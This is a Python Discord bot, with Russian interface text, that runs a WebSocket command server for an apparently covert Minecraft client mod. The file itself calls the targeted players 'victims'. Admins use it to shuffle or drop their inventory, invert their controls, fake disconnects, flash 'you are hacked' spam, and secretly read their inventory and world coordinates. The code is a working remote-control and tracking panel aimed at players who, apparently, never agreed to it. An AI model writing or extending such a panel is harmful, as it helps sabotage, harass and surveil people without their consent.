import os
import asyncio
import json
import discord
from discord.ext import commands
import websockets
from websockets.asyncio.server import serve

BOT_TOKEN = os.environ.get("BOT_TOKEN")
TROLL_CHANNEL_ID = 1515619222842114158
WS_PORT = 8765

CONFIG_FILE = "config.json"

# ── Конфиг ───────────────────────────────────────────────────────────────────

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    return {"owner_id": None, "admin_ids": [], "protected_nicks": []}

def save_config():
    with open(CONFIG_FILE, "w") as f:
        json.dump({
            "owner_id": config["owner_id"],
            "admin_ids": list(config["admin_ids"]),
            "protected_nicks": list(config["protected_nicks"])
        }, f, indent=2)

config = load_config()
config["admin_ids"] = set(config["admin_ids"])
config["protected_nicks"] = set(config["protected_nicks"])

def is_owner(user_id: int) -> bool:
    return config["owner_id"] == user_id

def is_admin(user_id: int) -> bool:
    return is_owner(user_id) or user_id in config["admin_ids"]

def is_protected(nick: str) -> bool:
    return nick.lower() in {n.lower() for n in config["protected_nicks"]}

# ── Discord бот ───────────────────────────────────────────────────────────────

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="/", intents=intents)

connected_players: dict[str, dict] = {}
troll_message: discord.Message = None

# Хранилище pending-запросов: nick -> asyncio.Future
pending_inventory: dict[str, asyncio.Future] = {}
pending_coords: dict[str, asyncio.Future] = {}


def make_embed(players: dict) -> discord.Embed:
    embed = discord.Embed(title="🎰 Casino Troll Panel", color=0xFF4444)
    if players:
        lines = []
        for nick, info in players.items():
            server = info.get("server", "???")
            shield = " 🛡️" if is_protected(nick) else ""
            lines.append(f"• `{nick}`{shield} — {server}")
        embed.add_field(name="🟢 Онлайн", value="\n".join(lines), inline=False)
    else:
        embed.add_field(name="🔴 Онлайн", value="Никого нет", inline=False)
    embed.set_footer(text="Выбери игрока и нажми кнопку | 🛡️ = защищён")
    return embed


class PlayerSelect(discord.ui.Select):
    def __init__(self):
        players = list(connected_players.keys())
        options = [discord.SelectOption(label=p, value=p) for p in players] if players else [
            discord.SelectOption(label="Никого нет", value="none")
        ]
        super().__init__(placeholder="Выбери жертву...", options=options)

    async def callback(self, interaction: discord.Interaction):
        if not is_admin(interaction.user.id):
            await interaction.response.send_message("❌ У тебя нет доступа к панели!", ephemeral=True)
            return
        bot.selected_player = self.values[0]
        nick = self.values[0]
        if is_protected(nick):
            await interaction.response.send_message(f"🛡️ `{nick}` защищён от троллинга!", ephemeral=True)
        else:
            await interaction.response.send_message(f"✅ Выбран: `{nick}`", ephemeral=True)


class DropModal(discord.ui.Modal, title="Выбросить предметы"):
    slot = discord.ui.TextInput(label="Слот (0-35 или 'all')", default="all", max_length=10)
    amount = discord.ui.TextInput(label="Количество (1-64 или 'all')", default="all", max_length=5)

    async def on_submit(self, interaction: discord.Interaction):
        player = getattr(bot, "selected_player", None)
        if not player or player not in connected_players:
            await interaction.response.send_message("❌ Игрок не выбран!", ephemeral=True)
            return
        if is_protected(player):
            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True)
            return
        slot_val = self.slot.value.strip().lower()
        amount_val = self.amount.value.strip().lower()
        if slot_val != "all":
            try:
                s = int(slot_val)
                if not 0 <= s <= 35:
                    await interaction.response.send_message("❌ Слот 0-35!", ephemeral=True)
                    return
            except ValueError:
                await interaction.response.send_message("❌ Неверный слот!", ephemeral=True)
                return
        if amount_val != "all":
            try:
                a = int(amount_val)
                if not 1 <= a <= 64:
                    await interaction.response.send_message("❌ Количество 1-64!", ephemeral=True)
                    return
            except ValueError:
                await interaction.response.send_message("❌ Неверное количество!", ephemeral=True)
                return
        cmd = f"drop:{slot_val}:{amount_val}"
        await connected_players[player]["ws"].send(cmd)
        await interaction.response.send_message(f"✅ Выброс → `{player}` слот {slot_val} x{amount_val}", ephemeral=True)


class SpamModal(discord.ui.Modal, title="Спам на экране"):
    message = discord.ui.TextInput(label="Сообщение", default="ТЫ ВЗЛОМАН 😈", max_length=50)
    count = discord.ui.TextInput(label="Повторений (1-30)", default="10", max_length=3)

    async def on_submit(self, interaction: discord.Interaction):
        player = getattr(bot, "selected_player", None)
        if not player or player not in connected_players:
            await interaction.response.send_message("❌ Игрок не выбран!", ephemeral=True)
            return
        if is_protected(player):
            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True)
            return
        try:
            c = int(self.count.value.strip())
            if not 1 <= c <= 30:
                await interaction.response.send_message("❌ Повторений 1-30!", ephemeral=True)
                return
        except ValueError:
            await interaction.response.send_message("❌ Неверное число!", ephemeral=True)
            return
        cmd = f"spam:{self.message.value}:{c}"
        await connected_players[player]["ws"].send(cmd)
        await interaction.response.send_message(f"✅ Спам → `{player}` | `{self.message.value}` x{c}", ephemeral=True)


class TrollView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(PlayerSelect())

    async def send_cmd(self, interaction: discord.Interaction, cmd: str, label: str):
        if not is_admin(interaction.user.id):
            await interaction.response.send_message("❌ У тебя нет доступа!", ephemeral=True)
            return
        player = getattr(bot, "selected_player", None)
        if not player or player not in connected_players:
            await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True)
            return
        if is_protected(player):
            await interaction.response.send_message(f"🛡️ `{player}` защищён от троллинга!", ephemeral=True)
            return
        try:
            await connected_players[player]["ws"].send(cmd)
            await interaction.response.send_message(f"✅ `{label}` → `{player}`", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)

    @discord.ui.button(label="🔀 Перемешать инвентарь", style=discord.ButtonStyle.danger, row=1)
    async def shuffle(self, interaction, button):
        await self.send_cmd(interaction, "shuffle", "Инвентарь перемешан")

    @discord.ui.button(label="🎮 Инвертировать WASD", style=discord.ButtonStyle.danger, row=1)
    async def invert(self, interaction, button):
        await self.send_cmd(interaction, "invert", "WASD инвертирован на 30с")

    @discord.ui.button(label="♻️ Вернуть управление", style=discord.ButtonStyle.secondary, row=1)
    async def restore(self, interaction, button):
        await self.send_cmd(interaction, "restore", "Управление восстановлено")

    @discord.ui.button(label="📦 Выбросить предметы...", style=discord.ButtonStyle.danger, row=2)
    async def drop(self, interaction, button):
        if not is_admin(interaction.user.id):
            await interaction.response.send_message("❌ У тебя нет доступа!", ephemeral=True)
            return
        await interaction.response.send_modal(DropModal())

    @discord.ui.button(label="💬 Спам на экране...", style=discord.ButtonStyle.primary, row=2)
    async def spam(self, interaction, button):
        if not is_admin(interaction.user.id):
            await interaction.response.send_message("❌ У тебя нет доступа!", ephemeral=True)
            return
        await interaction.response.send_modal(SpamModal())

    @discord.ui.button(label="📡 Фейк-дисконнект", style=discord.ButtonStyle.secondary, row=2)
    async def fakedisco(self, interaction, button):
        await self.send_cmd(interaction, "fakedisco", "Фейк-дисконнект")

    @discord.ui.button(label="🍌 Бананчик", style=discord.ButtonStyle.danger, row=3)
    async def banana(self, interaction, button):
        await self.send_cmd(interaction, "banana", "Бананчик запущен")

    @discord.ui.button(label="🧯 Огнетушитель", style=discord.ButtonStyle.primary, row=3)
    async def extinguisher(self, interaction, button):
        await self.send_cmd(interaction, "extinguisher", "Огнетушитель!")

    # ── НОВЫЕ КНОПКИ ─────────────────────────────────────────────────────────

    @discord.ui.button(label="👜 Просмотреть инвентарь", style=discord.ButtonStyle.secondary, row=4)
    async def view_inventory(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_admin(interaction.user.id):
            await interaction.response.send_message("❌ У тебя нет доступа!", ephemeral=True)
            return
        player = getattr(bot, "selected_player", None)
        if not player or player not in connected_players:
            await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True)
            return

        await interaction.response.defer(ephemeral=True, thinking=True)

        # Создаём Future и отправляем запрос клиенту
        loop = asyncio.get_event_loop()
        future: asyncio.Future = loop.create_future()
        pending_inventory[player] = future

        try:
            await connected_players[player]["ws"].send("get_inventory")
            # Ждём ответа максимум 5 секунд
            data = await asyncio.wait_for(asyncio.shield(future), timeout=5.0)
        except asyncio.TimeoutError:
            pending_inventory.pop(player, None)
            await interaction.followup.send("⏱️ Клиент не ответил (таймаут 5с). Убедись, что мод установлен и поддерживает `inventory_data`.", ephemeral=True)
            return
        except Exception as e:
            pending_inventory.pop(player, None)
            await interaction.followup.send(f"❌ Ошибка: {e}", ephemeral=True)
            return

        # data — список предметов: [{"slot": 0, "item": "minecraft:diamond_sword", "count": 1, "name": "..."}, ...]
        if not data:
            await interaction.followup.send(f"🎒 Инвентарь `{player}` пуст.", ephemeral=True)
            return

        embed = discord.Embed(title=f"👜 Инвентарь игрока {player}", color=0x5865F2)

        # Разбиваем по категориям слотов
        armor_slots = {5: "🪖 Шлем", 6: "🦺 Нагрудник", 7: "🩱 Поножи", 8: "👢 Ботинки"}
        hotbar = []
        main_inv = []
        armor = []
        offhand = []

        for entry in data:
            slot = entry.get("slot", -1)
            item = entry.get("item", "???").replace("minecraft:", "")
            count = entry.get("count", 1)
            name = entry.get("name", "")
            display = f"`{item}` x{count}" + (f" _{name}_" if name else "")

            if slot in armor_slots:
                armor.append(f"{armor_slots[slot]}: {display}")
            elif slot == 9:
                offhand.append(f"Щит/левая рука: {display}")
            elif 0 <= slot <= 8:
                hotbar.append(f"[{slot}] {display}")
            elif 10 <= slot <= 35:
                main_inv.append(f"[{slot}] {display}")

        if armor:
            embed.add_field(name="🛡️ Броня", value="\n".join(armor), inline=False)
        if hotbar:
            embed.add_field(name="🔧 Хотбар (0–8)", value="\n".join(hotbar), inline=False)
        if main_inv:
            # Discord ограничивает поле 1024 символами — режем если надо
            inv_text = "\n".join(main_inv)
            if len(inv_text) > 1000:
                inv_text = inv_text[:1000] + "\n…"
            embed.add_field(name="🎒 Основной инвентарь", value=inv_text, inline=False)
        if offhand:
            embed.add_field(name="🤚 Левая рука", value="\n".join(offhand), inline=False)

        await interaction.followup.send(embed=embed, ephemeral=True)

    @discord.ui.button(label="📍 Показать координаты", style=discord.ButtonStyle.secondary, row=4)
    async def view_coords(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_admin(interaction.user.id):
            await interaction.response.send_message("❌ У тебя нет доступа!", ephemeral=True)
            return
        player = getattr(bot, "selected_player", None)
        if not player or player not in connected_players:
            await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True)
            return

        await interaction.response.defer(ephemeral=True, thinking=True)

        loop = asyncio.get_event_loop()
        future: asyncio.Future = loop.create_future()
        pending_coords[player] = future

        try:
            await connected_players[player]["ws"].send("get_coords")
            data = await asyncio.wait_for(asyncio.shield(future), timeout=5.0)
        except asyncio.TimeoutError:
            pending_coords.pop(player, None)
            await interaction.followup.send("⏱️ Клиент не ответил (таймаут 5с). Убедись, что мод поддерживает `coords_data`.", ephemeral=True)
            return
        except Exception as e:
            pending_coords.pop(player, None)
            await interaction.followup.send(f"❌ Ошибка: {e}", ephemeral=True)
            return

        # data = {"x": 123.4, "y": 64.0, "z": -789.2, "world": "minecraft:overworld", "dimension": "Обычный мир"}
        x = data.get("x", "?")
        y = data.get("y", "?")
        z = data.get("z", "?")
        world = data.get("world", "???")
        dimension = data.get("dimension", world)

        # Красиво форматируем координаты
        world_emojis = {
            "minecraft:overworld": "🌍",
            "minecraft:the_nether": "🔥",
            "minecraft:the_end": "🌑",
        }
        world_emoji = world_emojis.get(world, "🌐")

        embed = discord.Embed(title=f"📍 Координаты игрока {player}", color=0x57F287)
        embed.add_field(
            name=f"{world_emoji} Мир",
            value=f"`{dimension}`",
            inline=False
        )
        embed.add_field(name="X", value=f"`{x:.1f}`" if isinstance(x, float) else f"`{x}`", inline=True)
        embed.add_field(name="Y", value=f"`{y:.1f}`" if isinstance(y, float) else f"`{y}`", inline=True)
        embed.add_field(name="Z", value=f"`{z:.1f}`" if isinstance(z, float) else f"`{z}`", inline=True)

        await interaction.followup.send(embed=embed, ephemeral=True)

    # ── Обновить список ───────────────────────────────────────────────────────

    @discord.ui.button(label="🔄 Обновить список", style=discord.ButtonStyle.success, row=3)
    async def refresh(self, interaction, button):
        if not is_admin(interaction.user.id):
            await interaction.response.send_message("❌ У тебя нет доступа!", ephemeral=True)
            return
        await interaction.response.edit_message(
            embed=make_embed(connected_players),
            view=TrollView()
        )


async def update_panel():
    global troll_message
    if troll_message:
        try:
            await troll_message.edit(embed=make_embed(connected_players), view=TrollView())
        except:
            pass


async def notify_player(nick: str, protected: bool):
    if nick in connected_players:
        try:
            ws = connected_players[nick]["ws"]
            await ws.send(json.dumps({"type": "admin_status", "protected": protected}))
        except:
            pass


async def ws_handler(ws):
    nick = None
    try:
        async for raw in ws:
            data = json.loads(raw)
            msg_type = data.get("type")

            if msg_type == "hello":
                nick = data["nick"]
                server = data.get("server", "...")
                connected_players[nick] = {"ws": ws, "server": server}
                print(f"[WS] Подключился: {nick} @ {server}")
                await ws.send(json.dumps({"type": "admin_status", "protected": is_protected(nick)}))
                await update_panel()

            elif msg_type == "server" and nick in connected_players:
                connected_players[nick]["server"] = data["server"]
                await update_panel()

            # ── Ответ на запрос инвентаря ──────────────────────────────────
            elif msg_type == "inventory_data" and nick:
                # Ожидаемый формат от клиента:
                # {"type": "inventory_data", "items": [{"slot": 0, "item": "minecraft:diamond", "count": 5, "name": ""}, ...]}
                future = pending_inventory.pop(nick, None)
                if future and not future.done():
                    future.set_result(data.get("items", []))

            # ── Ответ на запрос координат ──────────────────────────────────
            elif msg_type == "coords_data" and nick:
                # Ожидаемый формат от клиента:
                # {"type": "coords_data", "x": 123.4, "y": 64.0, "z": -789.2,
                #  "world": "minecraft:overworld", "dimension": "Обычный мир"}
                future = pending_coords.pop(nick, None)
                if future and not future.done():
                    future.set_result({
                        "x": data.get("x", 0),
                        "y": data.get("y", 0),
                        "z": data.get("z", 0),
                        "world": data.get("world", "???"),
                        "dimension": data.get("dimension", data.get("world", "???"))
                    })

    except Exception as e:
        print(f"[WS] Ошибка: {e}")
    finally:
        if nick and nick in connected_players:
            del connected_players[nick]
            print(f"[WS] Отключился: {nick}")
            await update_panel()
        # Сбрасываем pending futures при дисконнекте
        for d in (pending_inventory, pending_coords):
            fut = d.pop(nick, None) if nick else None
            if fut and not fut.done():
                fut.cancel()


async def start_ws_server():
    async with serve(ws_handler, "0.0.0.0", WS_PORT) as server:
        print(f"[WS] Сервер запущен на порту {WS_PORT}")
        await server.serve_forever()


# ── Команды ──────────────────────────────────────────────────────────────────

@bot.command(name="setowner")
async def set_owner(ctx, discord_id: int):
    """/setowner <id> — установить владельца (работает только если владелец ещё не задан)."""
    if config["owner_id"] is not None:
        if not is_owner(ctx.author.id):
            await ctx.message.delete()
            await ctx.send("❌ Владелец уже задан.", delete_after=5)
            return
    config["owner_id"] = discord_id
    save_config()
    await ctx.message.delete()
    await ctx.send(f"👑 Владелец установлен: `{discord_id}`", delete_after=5)


@bot.command(name="addidadmin")
async def add_id_admin(ctx, discord_id: int):
    """/addidadmin <discord_id> — добавить админа по Discord ID."""
    await ctx.message.delete()
    if not is_owner(ctx.author.id):
        await ctx.send("❌ Только владелец может добавлять админов.", delete_after=5)
        return
    config["admin_ids"].add(discord_id)
    save_config()
    await ctx.send(f"✅ Администратор `{discord_id}` добавлен.", delete_after=5)


@bot.command(name="removeadmin")
async def remove_admin(ctx, discord_id: int):
    """/removeadmin <discord_id> — убрать админа."""
    await ctx.message.delete()
    if not is_owner(ctx.author.id):
        await ctx.send("❌ Только владелец может убирать админов.", delete_after=5)
        return
    config["admin_ids"].discard(discord_id)
    save_config()
    await ctx.send(f"✅ Администратор `{discord_id}` удалён.", delete_after=5)


@bot.command(name="addNotroll")
async def add_notroll(ctx, mc_nick: str):
    """/addNotroll <ник> — защитить Minecraft ник от троллинга."""
    await ctx.message.delete()
    if not is_admin(ctx.author.id):
        await ctx.send("❌ Нет доступа.", delete_after=5)
        return
    config["protected_nicks"].add(mc_nick)
    save_config()
    await notify_player(mc_nick, True)
    await update_panel()
    await ctx.send(f"🛡️ Ник `{mc_nick}` теперь защищён.", delete_after=5)


@bot.command(name="removeNotroll")
async def remove_notroll(ctx, mc_nick: str):
    """/removeNotroll <ник> — снять защиту с ника."""
    await ctx.message.delete()
    if not is_admin(ctx.author.id):
        await ctx.send("❌ Нет доступа.", delete_after=5)
        return
    config["protected_nicks"].discard(mc_nick)
    save_config()
    await notify_player(mc_nick, False)
    await update_panel()
    await ctx.send(f"✅ Ник `{mc_nick}` больше не защищён.", delete_after=5)


@bot.command(name="adminlist")
async def admin_list(ctx):
    """/adminlist — список всех админов и защищённых ников."""
    await ctx.message.delete()
    if not is_owner(ctx.author.id):
        await ctx.send("❌ Только владелец.", delete_after=5)
        return
    lines = [f"👑 Владелец: `{config['owner_id']}`"]
    if config["admin_ids"]:
        lines.append("👮 Админы: " + ", ".join(f"`{i}`" for i in config["admin_ids"]))
    if config["protected_nicks"]:
        lines.append("🛡️ Защищённые: " + ", ".join(f"`{n}`" for n in config["protected_nicks"]))
    await ctx.send("\n".join(lines), delete_after=15)


@bot.event
async def on_ready():
    global troll_message
    print(f"[Bot] Запущен как {bot.user}")
    channel = bot.get_channel(TROLL_CHANNEL_ID)
    if channel:
        troll_message = await channel.send(embed=make_embed({}), view=TrollView())
    asyncio.create_task(start_ws_server())


bot.selected_player = None
bot.run(BOT_TOKEN)
